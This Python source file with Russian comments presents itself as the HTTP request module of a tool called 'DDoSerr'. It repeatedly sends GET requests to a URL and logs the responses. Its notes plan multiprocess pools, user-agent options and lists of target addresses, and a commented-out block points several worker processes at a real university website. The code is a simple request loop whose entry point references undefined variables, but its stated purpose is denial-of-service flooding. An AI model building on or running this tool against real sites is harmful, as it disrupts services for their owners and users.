#!/usr/bin/python3
#Путь к интерпретатору пайтона.
# -*- coding: utf-8 -*-
#Выбор кодировки (без него не работает русский язык).

"""
Модуль отправки HTTP-запросов для DDoSerr.
v.1.5.2b. от 09.07.2018.
"""

"""
Легенда обозначений:
"___" - переделать / удалить;
"---" - отладка;
"~~~" - сделать;
"!" - первоочередная задача.
"""

#Используем библиотеку requests.
import requests
#Подключаем модуль времени.
import time
#Подключаем модуль взаимодействия с системой.
import os
#Подключаем готовый модуль логгирования.
import logging

#Настройка логгирования.
logging.basicConfig(filename='log.log',level=logging.INFO, \
format='%(asctime)s %(message)s', datefmt='%d.%m.%Y - %I:%M:%S |')
#Пока не нужен подробный лог.
#logging.basicConfig(filename='log.log',level=logging.DEBUG)

#Перенос кода через '\'.

def http_connection(repeat, pause, url="http://127.0.0.1"):
    """
    Функция для создания одного запроса к сайту и получения ответа.
    """
    #https://httpbin.org/get
    #Если не задаётся извне значение url, то берётся указанное.
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #!Позже добавить в аргументы user_agent!
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    

    
    for _ in range(repeat):
        request = requests.get(url, stream=True)
        #Для post запросов, пригодится в будущем.
        #request = requests.post("http://httpbin.org/post")
    
        status = str(request.status_code)
        size = str(sum(len(chunk) for chunk in request.iter_content(8196)))
        #Для типа.
        #head = str(request.headers['content-type'])
        
        #Этот вывод результата можно убрать для повышения производительности.
        print(status, size)
        
        answer = str("code " + status + "," + '\t' + "size " + size)
        
        #Логгируем запуск процесса с его PID.
        logging.info('Process ' + str(os.getpid()) + ' received the task.')
        #Логгируем результаты.
        logging.info('Answer: ' + answer)
        
        #Задержка перед повтором цикла.
        time.sleep(pause)
    
"""
Проверить одновременность работы через apply_async! 
Если не одновременно, то переделать под map_async!
Работает.
Надо через MAP так:
https://stackoverflow.com/questions/11996632/multiprocessing-in-python-while-limiting-the-number-of-running-processes
Перевод (кривенький): http://qaru.site/questions/306301/multiprocessing-in-python-while-limiting-the-number-of-running-processes

!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
!Вместо url надо сделать список адресов с задерками.
!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
"""

    
"""
То, что находится внутри if __name__ == "__main__" будет выполнено 
только в том случае, когда модуль запущен отдельно, а не импортирован. 
"""
if __name__ == "__main__":
    """
    Реализация многопоточности для самостоятельного запуска модуля.
    Хорошо работает.
    Но в докстринге, т.к. используется другой способ.
    #Получается 4 процесса: один родительский и 3 дочерних.
    
    
    #Создаём пул из 3-х работников (процессов).
    pool = Pool(processes=3)
    #Задаём набор параметров для задания (по количеству процессов + 1). 
    #Пока что вручную.
    urls = ["https://www.vsu.ru", "https://www.vsu.ru", "https://www.vsu.ru", "https://www.vsu.ru"]
    #Даём им задание и получаем результат.
    result = pool.map_async(http_connection, urls)
    
    #apply_async даёт задачу только одному процессу. Не подходит.
    #result = pool.apply_async(http_connection, ("https://www.vsu.ru",))
    
    #Вывод результата с таймаутом (если вдруг будет работать слишком долго).
    print(result.get(timeout=1))
    """
    
    #Запуск функции.
    http_connection(repeat, pause, url)

